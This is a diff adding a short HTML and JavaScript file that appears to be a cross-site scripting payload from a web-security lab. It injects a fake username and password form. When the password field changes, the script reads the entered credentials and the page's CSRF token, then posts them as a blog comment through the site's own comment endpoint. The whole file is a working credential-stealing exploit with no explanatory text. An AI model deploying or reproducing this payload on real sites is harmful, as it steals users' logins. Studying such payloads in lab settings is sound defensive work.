@@ -1,0 +1,32 @@
+<input type="text" name="username">
+<input type="password" name="password" onchange="hax()">
+
+<script>
+    function hax(){
+    var token = document.getElementsByName('csrf')[0].value;
+    var name = document.getElementsByName('username')[0].value;
+    var password = document.getElementsByName('password')[0].value;
+    data = new FormData();
+/*
+csrf=x
+&postId=8
+&comment=x
+&name=x
+&email=x
+&website=x
+*/
+
+    data.append('csrf', token);
+    data.append('postId', 8);
+    data.append('comment', `MyUserName:${name} MyPassword:${password}`);
+    data.append('name', 'victm');
+    data.append('email', 'email@gmail.com');
+    data.append('website', 'https://www.www.com');
+
+    fetch('/post/comment', {
+        method: 'POST',
+        mode:   'no-cors',
+        body:    data
+    });
+};
+</script>
